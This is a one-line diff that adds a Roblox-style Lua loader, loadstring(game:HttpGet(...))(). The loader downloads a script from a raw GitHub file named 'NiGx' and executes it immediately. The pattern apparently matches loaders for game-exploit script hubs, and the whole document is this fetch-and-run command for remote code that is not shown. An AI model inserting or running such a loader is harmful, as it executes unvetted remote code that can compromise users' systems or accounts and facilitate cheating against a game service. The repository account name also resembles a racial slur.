@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/niggux/NiGx/main/Tools/NiGx"))()
